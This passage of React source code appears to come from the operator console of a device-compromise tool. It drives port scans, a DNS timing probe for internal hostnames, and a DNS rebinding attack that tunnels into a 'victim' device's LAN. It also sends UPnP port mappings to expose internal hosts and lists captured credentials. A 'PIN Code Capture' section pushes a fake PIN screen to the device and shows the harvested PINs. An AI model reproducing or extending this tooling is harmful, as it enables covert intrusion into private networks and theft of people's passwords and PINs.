          const statusLabel = s => s === 'open' || s === 'closed' ? 'OPEN' : 'FILTERED';
          const statusColor = s => s === 'open' || s === 'closed' ? '#22c55e' : '#4e5a70';
          return (
            <div style={{ fontSize: 11, background: '#07080f', borderRadius: 8, padding: '8px 10px' }}>
              <div style={{ color: '#f59e0b', fontWeight: 600, marginBottom: 6 }}>
                {portScanResults.ip} - {openCount} open / {portScanResults.total} scanned
              </div>
              {all.length === 0 ? (
                <div style={{ color: '#4e5a70' }}>No results</div>
              ) : (
                <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                  <thead><tr style={{ color: '#4e5a70' }}>
                    <th style={{ textAlign: 'left', paddingBottom: 4 }}>Port</th>
                    <th style={{ textAlign: 'left', paddingBottom: 4 }}>Status</th>
                    <th style={{ textAlign: 'right', paddingBottom: 4 }}>ms</th>
                  </tr></thead>
                  <tbody>
                    {all.map((r, i) => (
                      <tr key={i}>
                        <td style={{ fontFamily: 'monospace', paddingBottom: 2, color: '#c9d1e8' }}>{r.port}</td>
                        <td style={{ paddingBottom: 2, color: statusColor(r.status) }}>{statusLabel(r.status)}</td>
                        <td style={{ textAlign: 'right', paddingBottom: 2, color: '#4e5a70' }}>{r.ms}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              )}
            </div>
          );
        })()}
      </div>

      {/* DNS Probe */}
      <div style={{ padding: '12px 14px', borderBottom: '1px solid #1c1c1e' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 8 }}>
          <div style={{ flex: 1 }}>
            <span style={{ fontSize: 12, fontWeight: 600, color: '#c9d1e8' }}>DNS Timing Oracle</span>
            <div style={{ fontSize: 10, color: '#4e5a70', marginTop: 2 }}>Detects internal hostnames reachable from the device - reveals corporate network, VPN, or LAN presence without any permissions.</div>
          </div>
          <button disabled={dnsSending || !dnsHosts.trim()} onClick={async () => {
            const hostnames = dnsHosts.split(/[\n,\s]+/).map(h => h.trim()).filter(Boolean);
            setDnsSending(true);
            try { await sendRecon('dns_probe', { hostnames, timeout: 3000 }); }
            catch (e) { alert(e.message); }
            finally { setDnsSending(false); }
          }} style={{ ...btnStyle('#3b82f6'), opacity: !dnsHosts.trim() ? 0.4 : 1 }}>{dnsSending ? '⏳' : '▶ Probe'}</button>
        </div>
        <textarea value={dnsHosts} onChange={e => setDnsHosts(e.target.value)}
          placeholder={'internal.corp.com\nrouter.local\nvpn.company.local'}
          style={{ width: '100%', boxSizing: 'border-box', minHeight: 60, background: '#07080f', border: '1px solid #2c2c2e', color: '#c9d1e8', fontSize: 11, fontFamily: 'monospace', padding: '8px 10px', borderRadius: 8, resize: 'vertical', outline: 'none' }} />
        {dnsRes?.results?.length > 0 && (
          <div style={{ fontSize: 11, background: '#07080f', borderRadius: 8, padding: '8px 10px', marginTop: 8 }}>
            <div style={{ color: '#3b82f6', fontWeight: 600, marginBottom: 4 }}>DNS Results</div>
            <table style={{ width: '100%', borderCollapse: 'collapse' }}>
              <thead><tr style={{ color: '#4e5a70' }}>
                <th style={{ textAlign: 'left', paddingBottom: 4 }}>Host</th>
                <th style={{ textAlign: 'right', paddingBottom: 4 }}>DNS ms</th>
                <th style={{ textAlign: 'right', paddingBottom: 4 }}>TCP ms</th>
                <th style={{ textAlign: 'right', paddingBottom: 4 }}>Resolved</th>
              </tr></thead>
              <tbody>
                {dnsRes.results.map((r, i) => (
                  <tr key={i} style={{ color: r.resolved ? '#22c55e' : '#4e5a70' }}>
                    <td style={{ fontFamily: 'monospace', paddingBottom: 2, maxWidth: 200, overflow: 'hidden', textOverflow: 'ellipsis' }}>{r.host}</td>
                    <td style={{ textAlign: 'right', paddingBottom: 2 }}>{r.dns_ms ?? '-'}</td>
                    <td style={{ textAlign: 'right', paddingBottom: 2 }}>{r.connect_ms ?? '-'}</td>
                    <td style={{ textAlign: 'right', paddingBottom: 2 }}>{r.resolved ? '✓' : '✗'}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </div>

      {/* DNS Rebinding Attack */}
      <div style={{ padding: '12px 14px', opacity: rbReady ? 1 : 0.45, pointerEvents: rbReady ? 'auto' : 'none', position: 'relative' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 4 }}>
          <span style={{ fontSize: 12, fontWeight: 600, color: '#c9d1e8' }}>DNS Rebinding Attack</span>
          {rbHealth && !rbReady && (
            <a href="#/settings" onClick={e => { e.preventDefault(); window.location.hash = '/settings'; }}
              style={{ fontSize: 10, color: '#f59e0b', textDecoration: 'none', border: '1px solid rgba(245,158,11,0.31)', borderRadius: 4, padding: '1px 6px', pointerEvents: 'all' }}>
              ⚙ Fix in Settings
            </a>
          )}
          {!rbDomain && (
            <a href="#/settings" onClick={e => { e.preventDefault(); window.location.hash = '/settings'; }}
              style={{ fontSize: 10, color: '#f59e0b', textDecoration: 'none', border: '1px solid rgba(245,158,11,0.31)', borderRadius: 4, padding: '1px 6px', pointerEvents: 'all' }}>
              ⚙ Configure in Settings
            </a>
          )}
        </div>
        <div style={{ fontSize: 11, color: '#4e5a70', marginBottom: 8 }}>
          Opens HTTP popup on device, waits for DNS to flip to target IP, reads LAN response.
          {!rbReady && rbDomain && rbHealth && <span style={{ color: '#ef4444' }}> Prerequisite check not fully green.</span>}
        </div>
        {!rbTargetIP && rbDomain && <div style={{ fontSize: 11, color: '#4e5a70', marginBottom: 6 }}>Enter target LAN IP to attack.</div>}
        <div style={{ display: 'flex', gap: 6, alignItems: 'center', marginBottom: 6, flexWrap: 'wrap' }}>
          <input value={rbTargetIP} onChange={e => setRbTargetIP(e.target.value)}
            placeholder="192.168.1.1"
            style={{ flex: 1, minWidth: 120, background: '#07080f', border: '1px solid #2c2c2e', color: '#c9d1e8', borderRadius: 6, padding: '4px 8px', fontSize: 11, fontFamily: 'monospace' }} />
          <input value={rbTargetPort} onChange={e => setRbTargetPort(e.target.value)} placeholder="80"
            style={{ width: 56, background: '#07080f', border: '1px solid #2c2c2e', color: '#c9d1e8', borderRadius: 6, padding: '4px 8px', fontSize: 11, fontFamily: 'monospace' }} />
          <input value={rbTargetPath} onChange={e => setRbTargetPath(e.target.value)} placeholder="/"
            style={{ width: 80, background: '#07080f', border: '1px solid #2c2c2e', color: '#c9d1e8', borderRadius: 6, padding: '4px 8px', fontSize: 11, fontFamily: 'monospace' }} />
          {rbPreflip === 'idle' && (
            <button onClick={rbPreFlip} disabled={!rbDomain || !rbTargetIP}
              style={{ padding: '4px 10px', borderRadius: 6, border: '1px solid rgba(245,158,11,0.38)', background: 'none', color: '#f59e0b', fontSize: 11, fontWeight: 600, cursor: (!rbDomain || !rbTargetIP) ? 'default' : 'pointer', opacity: (!rbDomain || !rbTargetIP) ? 0.4 : 1 }}>
              Pre-flip</button>
          )}
          {rbPreflip === 'priming' && (
            <button onClick={rbCancelPreflip}
              style={{ padding: '4px 10px', borderRadius: 6, border: '1px solid rgba(245,158,11,0.38)', background: 'rgba(245,158,11,0.09)', color: '#f59e0b', fontSize: 11, fontWeight: 600, cursor: 'pointer' }}>
              ⏳ {rbPreflipSec}s</button>
          )}
          {rbPreflip === 'ready' && (
            <button onClick={rbCancelPreflip}
              style={{ padding: '4px 10px', borderRadius: 6, border: '1px solid #30d15860', background: 'rgba(34,197,94,0.09)', color: '#22c55e', fontSize: 11, fontWeight: 600, cursor: 'pointer' }}>
              ✓ Armed</button>
          )}
          <button onClick={rbRunLaunch} disabled={rbRunning || !rbDomain || !rbTargetIP || rbPreflip === 'idle' || !deviceOnline}
            title={!deviceOnline ? 'Device offline - cannot fire' : rbPreflip === 'priming' ? 'Fire now (DNS priming in progress)' : undefined}
            style={{ padding: '4px 12px', borderRadius: 6, border: 'none', fontWeight: 600, fontSize: 11, cursor: (rbRunning || rbPreflip === 'idle' || !deviceOnline) ? 'default' : 'pointer',
              background: rbRunning ? 'rgba(255,255,255,0.09)' : !deviceOnline ? 'rgba(255,255,255,0.09)' : rbPreflip === 'ready' ? '#22c55e' : rbPreflip === 'priming' ? '#f59e0b' : 'rgba(255,255,255,0.09)',
              color: rbRunning ? '#4e5a70' : (rbPreflip === 'idle' || !deviceOnline) ? '#4e5a70' : '#fff',
              opacity: (!rbDomain || !rbTargetIP || rbPreflip === 'idle' || !deviceOnline) ? 0.4 : 1 }}>
            {rbRunning ? '⏳' : !deviceOnline ? '📵 Offline' : rbPreflip === 'ready' ? '🚀 Fire' : rbPreflip === 'priming' ? '🚀 Fire' : '🔒 Pre-flip first'}</button>
          {rbRunning && (
            <button onClick={rbStopAttack}
              style={{ padding: '4px 10px', borderRadius: 6, border: '1px solid rgba(245,158,11,0.31)', background: 'none', color: '#f59e0b', fontSize: 11, fontWeight: 600, cursor: 'pointer' }}>
              Stop</button>
          )}
        </div>
        {rbPreflip === 'priming' && (
          <div style={{ fontSize: 10, color: '#4e5a70', marginBottom: 4, fontFamily: 'monospace', display: 'flex', gap: 10, flexWrap: 'wrap' }}>
            {rbDnsStatus?.last_query_ip
              ? <span style={{ color: rbDnsStatus.proxy_updated ? '#22c55e' : '#4e5a70' }}>
                  DNS: {rbDnsStatus.last_query_ip}
                  {rbDnsStatus.proxy_updated ? ' ✓ router' : ' (VPS)'}
                  {rbDnsStatus.last_query_ts ? ` · ${Math.round(Date.now()/1000 - rbDnsStatus.last_query_ts)}s ago` : ''}
                </span>
              : <span>DNS: waiting for query…</span>
            }
          </div>
        )}
        {rbStatusMsg && <div style={{ fontSize: 11, color: '#4e5a70', marginBottom: 4 }}>{rbStatusMsg}</div>}
        {rbLiveStatus && rbRunning && (
          <div style={{ fontSize: 11, color: rbLiveStatus.phase === 'waiting_flip' ? '#f59e0b' : '#3b82f6', marginBottom: 4, fontFamily: 'monospace' }}>
            {rbLiveStatus.phase === 'waiting_flip' ? '⏳ Waiting for DNS flip' : '🔄 Fetching'} - attempt {rbLiveStatus.attempt}
          </div>
        )}
        {rbResult && (
          <div style={{ marginTop: 8 }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6 }}>
              <span style={{ fontSize: 11, padding: '2px 10px', borderRadius: 20, fontWeight: 700,
                background: rbResult.ok ? 'rgba(34,197,94,0.12)' : 'rgba(239,68,68,0.12)',
                border: `1px solid ${rbResult.ok ? 'rgba(34,197,94,0.31)' : 'rgba(239,68,68,0.31)'}`,
                color: rbResult.ok ? '#22c55e' : '#ef4444' }}>
                {rbResult.ok ? `● HTTP ${rbResult.status}` : `● Failed - ${rbResult.error ?? 'unknown'}`}
              </span>
              <button onClick={() => { setRbResult(null); setRbTunnelResp(null); rbRunLaunch(); }}
                disabled={!rbDomain || !rbTargetIP || rbPreflip !== 'ready'}
                style={{ padding: '2px 10px', borderRadius: 20, border: '1px solid #3a3a3c', background: 'none', color: '#4e5a70', fontSize: 11, cursor: 'pointer' }}>
                ↺ Re-launch</button>
            </div>
            {rbResult.ok && rbResult.body != null && (
              <pre style={{ margin: 0, padding: '8px 10px', borderRadius: 6, background: '#07080f', border: '1px solid #2c2c2e',
                fontSize: 11, color: '#c9d1e8', lineHeight: 1.5, overflowX: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all',
                maxHeight: 240, overflowY: 'auto' }}>
                {String(rbResult.body).slice(0, 4000)}{String(rbResult.body).length > 4000 ? '\n…[truncated]' : ''}
              </pre>
            )}
          </div>
        )}
        {rbResult?.ok && rbVpsIp && (
          <div style={{ marginTop: 10, padding: '10px 12px', borderRadius: 8, background: 'rgba(34,197,94,0.09)', border: '1px solid #30d15830' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 6 }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8, flexWrap: 'wrap' }}>
                <span style={{ fontSize: 11, fontWeight: 700, color: '#22c55e' }}>🔗 LAN Tunnel - {rbTargetIP}</span>
                <span style={{ fontSize: 10, padding: '1px 6px', borderRadius: 10, border: `1px solid ${rbVictimWs ? 'rgba(34,197,94,0.38)' : (rbWsRef.current?.readyState === WebSocket.OPEN && !rbVictimWs && rbTunnelStart) ? 'rgba(245,158,11,0.38)' : rbWsDead ? 'rgba(239,68,68,0.38)' : 'rgba(255,255,255,0.09)'}`, color: rbVictimWs ? '#22c55e' : (rbWsRef.current?.readyState === WebSocket.OPEN && !rbVictimWs && rbTunnelStart) ? '#f59e0b' : rbWsDead ? '#ef4444' : '#4e5a70' }}>
                  {rbVictimWs ? '⚡ WS Live' : (rbWsRef.current?.readyState === WebSocket.OPEN && rbTunnelStart) ? '⚡ No Victim' : rbWsDead ? '⚡ WS Dead' : '⏳ Polling'}
                </span>
                {rbTunnelStart && (() => {
                  const rem = Math.max(0, 3600000 - (rbWsTick * 1000 - (rbWsTick * 1000 - (Date.now() - rbTunnelStart))));
                  const remMs = Math.max(0, 3600000 - (Date.now() - rbTunnelStart));
                  const h = Math.floor(remMs / 3600000);
                  const m = Math.floor((remMs % 3600000) / 60000);
                  const s = Math.floor((remMs % 60000) / 1000);
                  return <span style={{ fontSize: 10, color: '#f59e0b', fontFamily: 'monospace' }}>{h}:{String(m).padStart(2,'0')}:{String(s).padStart(2,'0')}</span>;
                })()}
                <span style={{
                  fontSize: 10, padding: '1px 6px', borderRadius: 10,
                  border: `1px solid ${rtcStatus === 'connected' ? 'rgba(167,139,250,0.38)' : rtcStatus === 'negotiating' ? 'rgba(245,158,11,0.38)' : rtcStatus === 'failed' ? 'rgba(239,68,68,0.38)' : 'rgba(255,255,255,0.09)'}`,
                  color: rtcStatus === 'connected' ? '#a78bfa' : rtcStatus === 'negotiating' ? '#f59e0b' : rtcStatus === 'failed' ? '#ef4444' : '#4e5a70',
                }}>
                  {rtcStatus === 'connected' ? `P2P ${rtcLatency != null ? rtcLatency + 'ms' : ''}` : rtcStatus === 'negotiating' ? 'P2P...' : rtcStatus === 'failed' ? 'P2P fail' : 'P2P off'}
                </span>
                <button
                  onClick={() => _rbInitWebRTC(rbTokenRef.current)}
                  disabled={rtcStatus === 'negotiating'}
                  style={{
                    padding: '1px 8px', borderRadius: 6, border: '1px solid rgba(167,139,250,0.38)',
                    background: rtcStatus === 'connected' ? 'rgba(167,139,250,0.13)' : 'none',
                    color: rtcStatus === 'connected' ? '#a78bfa' : '#4e5a70',
                    fontSize: 10, fontWeight: 600, cursor: rtcStatus === 'negotiating' ? 'default' : 'pointer',
                    opacity: rtcStatus === 'negotiating' ? 0.5 : 1,
                  }}
                >
                  {rtcStatus === 'connected' ? 'P2P On' : 'Init P2P'}
                </button>
              </div>
              <button onClick={rbEndTunnel} style={{ padding: '2px 8px', borderRadius: 5, border: '1px solid rgba(239,68,68,0.31)', background: 'none', color: '#ef4444', fontSize: 11, cursor: 'pointer' }}>End</button>
            </div>
            <div style={{ display: 'flex', gap: 6, alignItems: 'center', marginBottom: 4 }}>
              <input value={rbTunnelPath} onChange={e => setRbTunnelPath(e.target.value)} onKeyDown={e => e.key === 'Enter' && rbBrowseTunnel()}
                placeholder="/path"
                style={{ flex: 1, background: '#07080f', border: '1px solid #3a3a3c', color: '#c9d1e8', borderRadius: 5, padding: '5px 8px', fontSize: 11, fontFamily: 'monospace' }} />
              <button onClick={() => rbBrowseTunnel()} disabled={rbTunnelLoading}
                style={{ padding: '5px 10px', borderRadius: 5, border: 'none', background: rbTunnelLoading ? 'rgba(255,255,255,0.09)' : '#22c55e',
                  color: rbTunnelLoading ? '#4e5a70' : '#000', fontSize: 11, fontWeight: 600, cursor: rbTunnelLoading ? 'default' : 'pointer' }}>
                {rbTunnelLoading ? '⏳' : 'Browse'}</button>
            </div>
            <div style={{ marginBottom: 8 }}>
              {rbTokenRef.current && (
                <a
                  href={`${window.location.protocol}//${window.location.hostname.replace(/^dashboard\./, 'clipper.')}/api/rb/tunnel/browse-ws/${rbTokenRef.current}?path=${encodeURIComponent(rbTunnelPath || '/')}`}
                  target="_blank" rel="noopener noreferrer"
                  style={{ fontSize: 10, color: '#3b82f6', fontFamily: 'monospace', wordBreak: 'break-all' }}
                >
                  ↗ Open in tab (clipper): /api/rb/tunnel/browse-ws/{rbTokenRef.current}?path={encodeURIComponent(rbTunnelPath || '/')}
                </a>
              )}
            </div>
            <div style={{ display: 'flex', gap: 6, marginBottom: 8, alignItems: 'center' }}>
              <input value={rbLiveIP} onChange={e => setRbLiveIP(e.target.value)}
                style={{ flex: 1, background: '#07080f', border: '1px solid #3a3a3c', color: '#c9d1e8', borderRadius: 5, padding: '5px 8px', fontSize: 11, fontFamily: 'monospace' }}
                placeholder="IP" />
              <input type="number" value={rbLivePort} onChange={e => setRbLivePort(e.target.value)}
                style={{ width: 64, background: '#07080f', border: '1px solid #3a3a3c', color: '#c9d1e8', borderRadius: 5, padding: '5px 6px', fontSize: 11, textAlign: 'center' }}
                placeholder="port" />
              <button onClick={async () => {
                const ws = rbWsRef.current;
                const newPort = parseInt(rbLivePort) || 80;
                const sessionPort = parseInt(rbTargetPort) || 80;
                const newIP = (rbLiveIP || rbTargetIP).trim();
                if (newPort !== sessionPort) {
                  // Port change requires a new session - end current, re-arm with new port
                  await apiFetch('/api/rb/unflip').catch(() => {});
                  if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type: 'end_tunnel' }));
                  setRbTargetPort(String(newPort));
                  setRbResult(null); setRbTunnelResp(null); setRbTunnelStart(null);
                  rbTokenRef.current = null;
                  localStorage.removeItem('wc_pending_rb');
                  return;
                }
                if (!ws || ws.readyState !== WebSocket.OPEN) return;
                const origin = `http://${rbDomain}${newPort !== 80 ? ':' + newPort : ''}`;
                if (newIP !== rbTargetIP) await apiFetch(`/api/rb/flip?target=${encodeURIComponent(newIP)}`).catch(() => {});
                ws.send(JSON.stringify({ type: 'change_target', origin, ip: newIP }));
              }}
                style={{ padding: '5px 10px', borderRadius: 5, border: '1px solid rgba(245,158,11,0.38)', background: 'none', color: '#f59e0b', fontSize: 11, fontWeight: 600, cursor: 'pointer' }}>
                Change</button>
            </div>
            {rbTunnelResp && (
              <div>
                <div style={{ fontSize: 11, marginBottom: 4, fontFamily: 'monospace', color: rbTunnelResp.ok ? '#22c55e' : '#ef4444' }}>
                  {rbTunnelResp.ok ? `HTTP ${rbTunnelResp.status} - ${String(rbTunnelResp.body ?? '').length} bytes  ${rbTunnelResp.url ?? ''}` : `Error: ${rbTunnelResp.error}`}
                </div>
                {rbTunnelResp.ok && rbTunnelResp.body && (
                  <pre style={{ margin: 0, padding: '8px 10px', borderRadius: 6, background: '#07080f', border: '1px solid #2c2c2e',
                    fontSize: 11, color: '#c9d1e8', lineHeight: 1.5, overflowX: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-all',
                    maxHeight: 300, overflowY: 'auto' }}>
                    {String(rbTunnelResp.body).slice(0, 8000)}{String(rbTunnelResp.body).length > 8000 ? '\n…[truncated]' : ''}
                  </pre>
                )}
              </div>
            )}
          </div>
        )}
        {rbUpnp && (
          <div style={{ marginTop: 10, padding: '10px 12px', borderRadius: 8, background: '#07080f', border: '1px solid rgba(59,130,246,0.25)' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 8 }}>
              <span style={{ fontSize: 11, fontWeight: 700, color: '#3b82f6' }}>🔌 UPnP/IGD - {rbUpnp.device?.friendlyName || 'Device'}</span>
              <button onClick={() => setRbUpnp(null)} style={{ padding: '1px 7px', borderRadius: 5, border: '1px solid #3a3a3c', background: 'none', color: '#4e5a70', fontSize: 11, cursor: 'pointer' }}>✕</button>
            </div>
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '3px 12px', fontSize: 10, fontFamily: 'monospace', marginBottom: 8 }}>
              {[
                ['Manufacturer', rbUpnp.device?.manufacturer],
                ['Model', rbUpnp.device?.modelName],
                ['Serial', rbUpnp.device?.serialNumber],
                ['UDN', rbUpnp.device?.UDN],
                ['WAN Type', rbUpnp.wanType?.split(':').pop()],
                ['External IP', rbUpnp.externalIP],
                ['Status', rbUpnp.connectionStatus],
                ['Control URL', rbUpnp.controlURL],
              ].filter(([,v]) => v).map(([k, v]) => (
                <div key={k} style={{ display: 'flex', gap: 4 }}>
                  <span style={{ color: '#4e5a70', flexShrink: 0 }}>{k}:</span>
                  <span style={{ color: '#c9d1e8', wordBreak: 'break-all' }}>{v}</span>
                </div>
              ))}
            </div>
            {rbUpnp.controlURL && (
              <div>
                <div style={{ fontSize: 10, color: '#4e5a70', marginBottom: 4, fontWeight: 600 }}>AddPortMapping - expose internal port to internet</div>
                <div style={{ display: 'flex', gap: 4, flexWrap: 'wrap', alignItems: 'center', marginBottom: 6 }}>
                  {[
                    { key: 'extPort', placeholder: 'Ext port', width: 70 },
                    { key: 'intIP',   placeholder: 'Int IP',   width: 110 },
                    { key: 'intPort', placeholder: 'Int port', width: 70 },
                    { key: 'desc',    placeholder: 'Desc',     width: 80 },
                  ].map(({ key, placeholder, width }) => (
                    <input key={key} value={rbUpnpSoap[key]} onChange={e => setRbUpnpSoap(s => ({ ...s, [key]: e.target.value }))}
                      placeholder={placeholder}
                      style={{ width, background: '#07080f', border: '1px solid #3a3a3c', color: '#c9d1e8', borderRadius: 5, padding: '4px 6px', fontSize: 10, fontFamily: 'monospace' }} />
                  ))}
                  <select value={rbUpnpSoap.proto} onChange={e => setRbUpnpSoap(s => ({ ...s, proto: e.target.value }))}
                    style={{ background: '#07080f', border: '1px solid #3a3a3c', color: '#c9d1e8', borderRadius: 5, padding: '4px 6px', fontSize: 10 }}>
                    <option>TCP</option><option>UDP</option>
                  </select>
                  <button onClick={async () => {
                    setRbUpnpSoapResult(null);
                    const { extPort, intIP, intPort, proto, desc } = rbUpnpSoap;
                    if (!extPort || !intIP || !intPort) return;
                    const soapNS = rbUpnp.wanType || 'urn:schemas-upnp-org:service:WANIPConnection:1';
                    const body = `<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="${soapNS}"><NewRemoteHost></NewRemoteHost><NewExternalPort>${extPort}</NewExternalPort><NewProtocol>${proto}</NewProtocol><NewInternalPort>${intPort}</NewInternalPort><NewInternalClient>${intIP}</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>${desc}</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>`;
                    try {
                      const r = await apiFetch('/api/rb/tunnel/request', { method: 'POST',
                        body: JSON.stringify({ token: rbTokenRef.current, url: rbUpnp.controlURL,
                          method: 'POST', headers: { 'Content-Type': 'text/xml; charset="utf-8"', 'SOAPAction': `"${soapNS}#AddPortMapping"` }, body }) });
                      setRbUpnpSoapResult({ ok: true, msg: `HTTP ${r?.status ?? '?'} - port mapping sent` });
                    } catch (e) { setRbUpnpSoapResult({ ok: false, msg: e.message }); }
                  }}
                    style={{ padding: '4px 10px', borderRadius: 5, border: 'none', background: '#3b82f6', color: '#c9d1e8', fontSize: 10, fontWeight: 600, cursor: 'pointer' }}>
                    Map Port
                  </button>
                </div>
                {rbUpnpSoapResult && (
                  <div style={{ fontSize: 10, fontFamily: 'monospace', color: rbUpnpSoapResult.ok ? '#22c55e' : '#ef4444' }}>{rbUpnpSoapResult.msg}</div>
                )}
              </div>
            )}
          </div>
        )}
        {mdmStatus && (
          <div style={{ marginTop: 10, padding: '10px 12px', borderRadius: 8, background: 'rgba(34,197,94,0.09)', border: '1px solid #30d15840' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 8 }}>
              <span style={{ fontSize: 11, fontWeight: 700, color: '#22c55e' }}>MDM Intelligence</span>
              <button onClick={() => setMdmStatus(null)} style={{ padding: '1px 7px', borderRadius: 5, border: '1px solid #3a3a3c', background: 'none', color: '#4e5a70', fontSize: 11, cursor: 'pointer' }}>x</button>
            </div>
            <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
              <span style={{ padding: '2px 8px', borderRadius: 10, fontSize: 10, fontWeight: 600, background: mdmStatus.enrolled ? 'rgba(34,197,94,0.13)' : 'rgba(255,255,255,0.09)', color: mdmStatus.enrolled ? '#22c55e' : '#4e5a70' }}>
                {mdmStatus.enrolled ? 'Enrolled' : 'Not Enrolled'}
              </span>
              {mdmStatus.vendor && (
                <span style={{ padding: '2px 8px', borderRadius: 10, fontSize: 10, fontWeight: 600, background: 'rgba(167,139,250,0.13)', color: '#a78bfa' }}>
                  {mdmStatus.vendor}
                </span>
              )}
              {mdmStatus.supervised && (
                <span style={{ padding: '2px 8px', borderRadius: 10, fontSize: 10, fontWeight: 600, background: 'rgba(245,158,11,0.13)', color: '#f59e0b' }}>Supervised</span>
              )}
              {mdmStatus.managed_apps_restricted && (
                <span style={{ padding: '2px 8px', borderRadius: 10, fontSize: 10, fontWeight: 600, background: 'rgba(239,68,68,0.13)', color: '#ef4444' }}>Apps Restricted</span>
              )}
            </div>
          </div>
        )}
        {capturedCreds.length > 0 && (
          <div style={{ marginTop: 10, padding: '10px 12px', borderRadius: 8, background: 'rgba(245,158,11,0.09)', border: '1px solid rgba(245,158,11,0.25)' }}>
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 8 }}>
              <span style={{ fontSize: 11, fontWeight: 700, color: '#f59e0b' }}>Credentials ({capturedCreds.length})</span>
              <button onClick={() => setCapturedCreds([])} style={{ padding: '1px 7px', borderRadius: 5, border: '1px solid #3a3a3c', background: 'none', color: '#4e5a70', fontSize: 11, cursor: 'pointer' }}>Clear</button>
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
              {capturedCreds.map((c, i) => (
                <div key={i} style={{ padding: '6px 8px', borderRadius: 6, background: '#07080f', border: '1px solid #2c2c2e', fontSize: 10, fontFamily: 'monospace' }}>
                  <span style={{ color: '#f59e0b', fontWeight: 700, marginRight: 6 }}>[{c.type}]</span>
                  {c.username && <span style={{ color: '#c9d1e8' }}>user={c.username} </span>}
                  {c.password && <span style={{ color: '#ef4444' }}>pass={c.password} </span>}
                  {c.matches && c.matches.map((m, j) => (
                    <span key={j} style={{ color: '#f59e0b', display: 'block', paddingLeft: 8 }}>{m.label}={m.value}</span>
                  ))}
                  {c.url && <span style={{ color: '#4e5a70', display: 'block' }}>{c.url}</span>}
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

    </>
  );
}

function PinCaptureSection({ deviceId, creds, onSent }) {
  const [attempts, setAttempts] = useState(3);
  const [sending, setSending] = useState(null);
  const [flash, setFlash] = useState(null);

  const pins = (creds || []).filter(c => c.username?.startsWith('pin_attempt_'))
    .sort((a, b) => (b.id || 0) - (a.id || 0));

  async function sendCmd(type, payload, label) {
    setSending(type);
    try {
      await sendCommand(deviceId, type, payload ?? {});
      setFlash({ ok: true, msg: `${label} queued` });
      setTimeout(() => setFlash(null), 3000);
      setTimeout(onSent, 1800);
    } catch (e) {
      setFlash({ ok: false, msg: e.message });
      setTimeout(() => setFlash(null), 3000);
    } finally { setSending(null); }
  }

  return (
    <CollapsibleSection label="🔐 PIN Code Capture" storageKey="pin_capture">
      <div style={{ padding: '12px 14px' }}>
        {/* Controls */}
        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 12 }}>
          <div style={{ fontSize: 11, color: '#4e5a70', fontWeight: 600, whiteSpace: 'nowrap' }}>Max attempts:</div>
          <div style={{ display: 'flex', gap: 4 }}>
            {[1, 2, 3, '∞'].map(n => (
              <button key={n} onClick={() => setAttempts(n === '∞' ? Infinity : n)} style={{
                padding: '3px 10px', borderRadius: 5, border: 'none', cursor: 'pointer', fontSize: 11, fontWeight: 600,
                background: attempts === (n === '∞' ? Infinity : n) ? 'rgba(239,68,68,0.25)' : '#141728',
                color: attempts === (n === '∞' ? Infinity : n) ? '#ef4444' : '#4e5a70',
              }}>{n}</button>
            ))}
          </div>
        </div>

        <div style={{ display: 'flex', gap: 8, marginBottom: 12 }}>
          <button
            onClick={() => sendCmd('trigger_harvest', { permission: 'pin_capture', attempts }, 'PIN screen')}
            disabled={!!sending}
            style={{ flex: 1, padding: '9px 0', borderRadius: 8, border: 'none', cursor: 'pointer', fontSize: 12, fontWeight: 700, background: 'rgba(239,68,68,0.18)', color: '#ef4444', opacity: sending ? 0.5 : 1 }}
          >
            {sending === 'trigger_harvest' ? '⟳ Sending…' : '🔐 Launch PIN Screen'}
          </button>
          <button
            onClick={() => sendCmd('dismiss_harvest', {}, 'Dismiss')}
            disabled={!!sending}
            style={{ flex: 1, padding: '9px 0', borderRadius: 8, border: 'none', cursor: 'pointer', fontSize: 12, fontWeight: 700, background: 'rgba(255,255,255,0.06)', color: '#8e8e93', opacity: sending ? 0.5 : 1 }}
          >
            {sending === 'dismiss_harvest' ? '⟳ Sending…' : '✕ Dismiss Screen'}
          </button>
        </div>

        {flash && (
          <div style={{ fontSize: 11, color: flash.ok ? '#22c55e' : '#ef4444', marginBottom: 8 }}>{flash.msg}</div>
        )}

        {/* Captured PINs */}
        {pins.length > 0 ? (
          <div>
            <div style={{ fontSize: 10, color: '#4e5a70', fontWeight: 700, letterSpacing: '0.06em', marginBottom: 6 }}>CAPTURED PINs</div>
            {pins.map((c, i) => (
              <div key={c.id || i} style={{ display: 'flex', alignItems: 'center', gap: 10, padding: '6px 10px', background: 'rgba(239,68,68,0.07)', border: '1px solid rgba(239,68,68,0.2)', borderRadius: 6, marginBottom: 5 }}>
                <span style={{ fontSize: 18, fontWeight: 700, color: '#ef4444', fontVariantNumeric: 'tabular-nums', letterSpacing: 4 }}>{c.password}</span>
                <span style={{ fontSize: 10, color: '#4e5a70', marginLeft: 'auto' }}>
                  attempt #{c.username.replace('pin_attempt_', '')}
                </span>
              </div>
            ))}
          </div>
        ) : (
